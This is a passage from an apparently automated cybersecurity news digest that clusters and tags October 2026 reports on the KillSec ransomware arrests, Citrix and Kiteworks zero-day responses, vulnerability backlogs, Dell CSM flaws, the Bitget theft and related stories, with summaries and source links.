raids to identify other potential members of the group. Advertisement Some of the group’s victims were identified by initials and the location and date of the attack in the indictment filed against Eltibrizi. This list includes I.D.O. in Puerto Rico in March 2025, U.S.B.L. in Washington state in March 2025 and A.A. in Louisiana in September 2025. Three of those victims align with organizations that were listed on KillSec’s data-leak site for Instituto de Ojos , US BioTek Laboratories and Accelerated Academy . Prosecutors accuse Eltibrizi, who allegedly participated in the conspiracy from at least March through November 2025, of placing calls as a KillSec representative in at least one of those extortion demands. “The defendant and his co-conspirators carried out targeted intrusions against multiple companies and organizations, stealing highly sensitive information and attempting to extort their victims for substantial sums of money,” Héctor Ramírez‑Carbó, acting U.S. attorney for the District of Puerto Rico, said in a statement. “Ransomware remains a serious and evolving threat to all sectors of our economy, from critical infrastructure to small businesses,” he added. Share Facebook LinkedIn Twitter Copy Link Add to Preferred Sources Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops The Department of Justice building is seen in Washington, DC, on August 9, 2022. (Photo by Stefani Reynolds / AFP) (Photo by STEFANI REYNOLDS/AFP via Getty Images) A spider hangs from the railing of a pedestrian bridge. (Moritz Frankenberg/Getty Images) The Department of Justice building is seen in Washington, DC, on August 9, 2022. (Photo by Stefani Reynolds / AFP) (Photo by STEFANI REYNOLDS/AFP via Getty Images) Latest Podcasts What the
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members
  - Published: 2026-10-01T19:44:43+00:00
  - Link: https://cyberscoop.com/killsec-ransomware-group-arrests-operation-killswitch/
  - Summary: The teenager-run cybercrime group victimized roughly 500 organizations in less than two years. The post Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members appeared first on CyberScoop .

### Cluster ef461b8ae5 — score 8

- Title: Kiteworks & Citrix Incidents Show Challenges of Zero-Day Response
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-10-02T16:56:30+00:00
- Link: https://www.darkreading.com/cybersecurity-operations/kiteworks-citrix-incidents-challenges-zero-day-response
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_industries: financial_services, government
- affected_products: Citrix
- cve_ids: CVE-2026-88771, CVE-2026-88772, CVE-2026-88778
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_industries: financial_services, government
- affected_products: Citrix
- cve_ids: CVE-2026-88771, CVE-2026-88778, CVE-2026-88772
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
One company told customers to power down its data-protection platform during a nine-hour window, while the other remained mum on reported attacks prior to releasing a patch for its product.
```

#### Full body

```
Cybersecurity Operations Application Security Cyber Risk Vulnerabilities & Threats News Kiteworks & Citrix Incidents Show Challenges of Zero-Day Response One company told customers to power down its data-protection platform during a nine-hour window, while the other remained mum on reported attacks prior to releasing a patch for its product. Robert Lemos , Contributing Writer October 2, 2026 5 Min Read Source: Robert Lemos On Sept. 24, threat detection firm GreyNoise Intelligence observed a single US-based IP address scanning for Citrix NetScaler installations and conducting remote code execution (RCE) attacks. The company issued alerts to customers about the malicious activity. Over the next two days, reports of potential zero-day attacks on NetScaler installations emerged on social media, and cybersecurity professionals debated whether the rumored attacks were true — some argued the activity targeted vulnerabilities already patched in August. On Sept. 26, however, Benjamin Harris, founder and CEO of exposure-management firm watchTowr, urged NetScaler users to take their systems offline. "Monday will be too late," he stated in a LinkedIn post . By Sunday, Citrix seemingly agreed, posting an update that patched eight vulnerabilities (CVE-2026-88771 through CVE-2026-88778), including two zero-days that had been exploited in the wild. The blog post did not recommend taking servers offline until they were patched, instead urging customers to "upgrad[e to] the versions containing the fix immediately." However, the two zero-days — CVE-2026-88771 and CVE-2026-88772 — came under widespread exploitation . Related: RemoteThreat Bets Security Teams Need to Test What Happens After Defenses Fail One Weekend, Two Disclosure Strategies The same weekend, data protection provider Kiteworks took a different road. On Sept. 25, the company issued a recommendation to customers, urging them to proactively take their systems offline based on intelligence about an imminent attack. With its engineering team and external national intelligence experts working together on identifying the security issue, the company warned that a zero-day attack could be coming. On Monday, Kiteworks published an advisory identifying the vulnerability with an update to patch it. In the end, the company determined the vulnerability would have affected only 1% of its customers, Kiteworks said in its statement . "Telling customers to take production systems offline is not a decision any vendor makes lightly, and we knew exactly what we were asking of them," Frank Balonis, the firm's CISO, said in the statement. "We made it anyway, because when the choice is between certainty and convenience, customer data is not something we are willing to gamble with. That decision is what made the rest possible. We would make the same call again tomorrow to protect our customers' data." Kiteworks exposed IP addresses affect countries worldwide but are concentrated in the United States and Europe. Source: Shadowserver.org The two approaches underscore the hazards for vendors that take aggressive defensive measures. Citrix's response has come under fire from many in the cybersecurity community as being too little, too late. Why didn't the company share intelligence sooner about the apparent zero-day attacks? Related: SWIFT Banking & Government Middleware Enables RCE On the other hand, Kiteworks' rare recommendation to shut down appliances could be considered overkill — especially since only 1% of customers were vulnerable — or an appropriately gauged response to a potentially significant attack targeting their customers, many of whom are government agencies or in regulated industries. The decision to call for customers to shut down their systems was "wild," according to John Strand, owner of Black Hills Information Security, a cybersecurity-training and penetration-testing firm. "This isn't an active attack — people aren't actively being breached — and yet the vendor is telling customers to
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Kiteworks & Citrix Incidents Show Challenges of Zero-Day Response
  - Published: 2026-10-02T16:56:30+00:00
  - Link: https://www.darkreading.com/cybersecurity-operations/kiteworks-citrix-incidents-challenges-zero-day-response
  - Summary: One company told customers to power down its data-protection platform during a nine-hour window, while the other remained mum on reported attacks prior to releasing a patch for its product.

### Cluster 65dcaf716c — score 8

- Title: Vulnerability Backlogs Are an Ownership Problem
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-10-02T14:00:00+00:00
- Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-backlogs-ownership-problem
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: government
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_industries: government
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Organizations don't need better vulnerability scanners; they need to know who owns their assets and has the authority and capacity to actually fix them.
```

#### Full body

```
Cybersecurity Operations Vulnerabilities & Threats Cyber Risk Commentary Vulnerability Backlogs Are an Ownership Problem Organizations don't need better vulnerability scanners; they need to know who owns their assets and has the authority and capacity to actually fix them. Nishant Sharma , Cybersecurity Leader October 2, 2026 4 Min Read Source: igoriss via Getty Images OPINION Most enterprises drowning in vulnerabilities don't have a detection problem. They have an accountability problem wearing a detection problem's clothing. You can see it in how they spend. When a backlog gets big enough to reach the board, the reflex is to buy better scanning — wider coverage, faster cycles, richer threat intel, a single pane of glass. A year later, the organization has excellent visibility into a backlog that has grown. That's a misdiagnosis, not a tooling failure. Scanning capacity and remediation capacity are independent variables, and only one of them scales with a purchase order. Point a modern scanner at an underinstrumented estate, and findings appear at a rate limited only by asset count and check depth. Remediation capacity is limited by engineering hours, change windows, application compatibility, vendor patch availability, and how much downtime the business will tolerate. None of that moves when you upgrade a license. Related: RemoteThreat Bets Security Teams Need to Test What Happens After Defenses Fail I watched authenticated scanning across a server estate triple our finding count in one quarter. Nothing had gotten less secure. We had just stopped being able to pretend we didn't know. Which produces a perverse incentive: If your program is measured on open findings, expanding coverage makes you look worse. Teams graded that way learn not to look. What a Backlog Actually Measures A backlog is a measure of unresolved ownership, not a measure of technical debt. Think about what has to be true for one finding to close. Someone knows the asset exists. Someone is accountable for it. That person can change it. That person has time to change it. And that person has a reason to do it before their other work. Scanning gets you the first one. The other four are governance. That's why two companies with identical tools, identical estates, and identical finding volumes can differ tenfold in how fast they fix things. Here are possible different situations: No owner. The asset isn't mapped to anyone. This is the most common failure and the worst, because a finding with no owner can't be escalated — there's nobody to escalate to. The unowned tail of your estate is also usually the oldest and most exposed part of it. Owner without authority. A team is accountable but can't act. The vendor controls the patch. Another team owns the platform. The application is contractually frozen. You get a queue that visibly misses a service-level agreement (SLA) while the assignee correctly points out they couldn't have done anything. Owner without capacity. Accountability and authority both exist, but remediation competes with feature delivery in the same backlog, refereed by a product owner whose bonus doesn't mention security. Invisible in tooling — the tickets look assigned and in progress. Owner without consequence. Everything's in place and nothing happens, because missing a remediation SLA costs nobody anything. If your security reporting goes to the security team instead of the owner's boss, this is your default state. Related: Kiteworks & Citrix Incidents Show Challenges of Zero-Day Response Escalating harder fixes exactly one of these. Address Asset Ownership First The highest-leverage move in an enterprise vulnerability program isn't a scanning upgrade. It's accurate, maintained asset-to-owner mapping. It's unglamorous work — reconciling the configuration management database (CMDB) against what scanners actually find, chasing the gaps, forcing a named owner onto every asset, including the ones nobody wants. It looks more like audit than security e
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Vulnerability Backlogs Are an Ownership Problem
  - Published: 2026-10-02T14:00:00+00:00
  - Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-backlogs-ownership-problem
  - Summary: Organizations don't need better vulnerability scanners; they need to know who owns their assets and has the authority and capacity to actually fix them.

### Cluster 542c77fc0d — score 8

- Title: Dell CSM Flaws Enable Unauthenticated Admin Access and Root on Kubernetes Nodes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-02T17:02:12+00:00
- Link: https://thehackernews.com/2026/10/dell-csm-flaws-enable-unauthenticated.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-63688

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-63688
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-63688
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Dell has released security updates to address multiple critical security flaws in Dell Container Storage Modules (CSM) that could be exploited by bad actors to take over susceptible systems. The vulnerabilities are listed below - CVE-2026-63688 (CVSS score: 10.0) - A missing authentication for critical function vulnerability in the csm-authorization-storage gRPC server that an
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Dell CSM Flaws Enable Unauthenticated Admin Access and Root on Kubernetes Nodes
  - Published: 2026-10-02T17:02:12+00:00
  - Link: https://thehackernews.com/2026/10/dell-csm-flaws-enable-unauthenticated.html
  - Summary: Dell has released security updates to address multiple critical security flaws in Dell Container Storage Modules (CSM) that could be exploited by bad actors to take over susceptible systems. The vulnerabilities are listed below - CVE-2026-63688 (CVSS score: 10.0) - A missing authentication for critical function vulnerability in the csm-authorization-storage gRPC server that an

### Cluster 8d712631ac — score 8

- Title: Police Arrest 16-Year-Old Suspected of Running KillSec, Seize Ransomware Leak Site and Servers
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T16:55:57+00:00
- Link: https://thehackernews.com/2026/10/police-arrest-16-year-old-suspected-of.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Police in Spain have arrested a 16-year-old whom investigators suspect of running the KillSec ransomware group. KillSec is accused of stealing data from organizations and threatening to publish it on its leak site unless they paid. The 16-year-old was one of 3 people arrested on September 30, when police also took control of that site. Investigators identified him as KillSec's suspected
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Police Arrest 16-Year-Old Suspected of Running KillSec, Seize Ransomware Leak Site and Servers
  - Published: 2026-10-01T16:55:57+00:00
  - Link: https://thehackernews.com/2026/10/police-arrest-16-year-old-suspected-of.html
  - Summary: Police in Spain have arrested a 16-year-old whom investigators suspect of running the KillSec ransomware group. KillSec is accused of stealing data from organizations and threatening to publish it on its leak site unless they paid. The 16-year-old was one of 3 people arrested on September 30, when police also took control of that site. Investigators identified him as KillSec's suspected

### Cluster cb3b90cdc3 — score 8

- Title: Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T05:21:10+00:00
- Link: https://thehackernews.com/2026/10/bitget-confirms-third-party-zero-day.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Cryptocurrency exchange Bitget on Wednesday confirmed that attackers who stole $387.5 million last week exploited a zero-day flaw in third-party security products, citing ongoing investigation findings from SlowMist. "Their investigation identified malicious activity involving third-party security products, including a zero-day vulnerability, and recovered a customized tool used by the attacker
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft
  - Published: 2026-10-01T05:21:10+00:00
  - Link: https://thehackernews.com/2026/10/bitget-confirms-third-party-zero-day.html
  - Summary: Cryptocurrency exchange Bitget on Wednesday confirmed that attackers who stole $387.5 million last week exploited a zero-day flaw in third-party security products, citing ongoing investigation findings from SlowMist. "Their investigation identified malicious activity involving third-party security products, including a zero-day vulnerability, and recovered a customized tool used by the attacker

### Cluster bc03121785 — score 8

- Title: New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-29T17:20:17+00:00
- Link: https://thehackernews.com/2026/09/new-spectre-v2-btr-attack-leaks-linux.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A group of academics from VUSec and Scuola Superiore Sant'Anna have disclosed details of a new Spectre CPU vulnerability variant that affects Just-In-Time (JIT) engines present in web browsers, language runtimes, and the operating system kernel, across multiple CPU vendors. The new Spectre v2 variant has been codenamed Branch Target Reuse (BTR). "The key insight is that, while modern CPUs
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses
  - Published: 2026-09-29T17:20:17+00:00
  - Link: https://thehackernews.com/2026/09/new-spectre-v2-btr-attack-leaks-linux.html
  - Summary: A group of academics from VUSec and Scuola Superiore Sant'Anna have disclosed details of a new Spectre CPU vulnerability variant that affects Just-In-Time (JIT) engines present in web browsers, language runtimes, and the operating system kernel, across multiple CPU vendors. The new Spectre v2 variant has been codenamed Branch Target Reuse (BTR). "The key insight is that, while modern CPUs

### Cluster 7dd217f11f — score 8

- Title: Google Suspends Open-Source Bug Bounty Due to AI Vulnerability Reports
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-05T10:30:00+00:00
- Link: https://www.infosecurity-magazine.com/news/google-suspends-opensource-bug/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Google has paused its Open Source Vulnerability Rewards Program due to a flood of AI submissions
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Google Suspends Open-Source Bug Bounty Due to AI Vulnerability Reports
  - Published: 2026-10-05T10:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/google-suspends-opensource-bug/
  - Summary: Google has paused its Open Source Vulnerability Rewards Program due to a flood of AI submissions

### Cluster 0d3ce97f33 — score 8

- Title: Two Zero-Days Exploited in Attack on Dutch Institute for Vulnerability Disclosure
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-02T08:25:00+00:00
- Link: https://www.infosecurity-magazine.com/news/zerodays-dutch-institute/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: vulnerability_disclosure
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: vulnerability_disclosure
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The Dutch Institute for Vulnerability Disclosure reveals agentic AI-powered attack using Zammad zero-days
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Two Zero-Days Exploited in Attack on Dutch Institute for Vulnerability Disclosure
  - Published: 2026-10-02T08:25:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/zerodays-dutch-institute/
  - Summary: The Dutch Institute for Vulnerability Disclosure reveals agentic AI-powered attack using Zammad zero-days

### Cluster ce7c6f69e5 — score 8

- Title: Behind the tags: How Elastic SIEM grades 1,781 detection rules on noise, speed, and threat coverage
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-10-05T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/threat-command/elastic-siem-detection-rule-tags
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
This article explains how Elastic SIEM uses a monthly automated telemetry pipeline to score prebuilt detection rules across noise, performance, threat, and profile dimensions, helping security teams decide which rules to enable first.
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: Behind the tags: How Elastic SIEM grades 1,781 detection rules on noise, speed, and threat coverage
  - Published: 2026-10-05T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/threat-command/elastic-siem-detection-rule-tags
  - Summary: This article explains how Elastic SIEM uses a monthly automated telemetry pipeline to score prebuilt detection rules across noise, performance, threat, and profile dimensions, helping security teams decide which rules to enable first.
